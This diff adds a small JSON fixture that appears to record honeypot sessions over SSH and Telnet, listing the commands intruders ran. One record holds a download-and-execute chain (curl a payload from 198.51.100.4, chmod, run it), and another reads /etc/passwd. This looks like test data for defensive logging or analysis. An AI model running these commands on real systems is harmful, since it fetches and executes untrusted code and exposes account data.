@@ -1,0 +1,25 @@
+[
+  {
+    "ID": "ms-001",
+    "Protocol": "SSH",
+    "TimesSeen": 17,
+    "FirstSeen": "2020-01-01T00:00:00Z",
+    "LastSeen": "2020-01-02T00:00:00Z",
+    "Commands": [
+      "whoami",
+      "uname -a",
+      "curl -s http://198.51.100.4/payload -o /tmp/payload",
+      "chmod +x /tmp/payload",
+      "/tmp/payload"
+    ]
+  },
+  {
+    "ID": "ms-002",
+    "Protocol": "Telnet",
+    "TimesSeen": 4,
+    "Commands": [
+      "id",
+      "cat /etc/passwd"
+    ]
+  }
+]
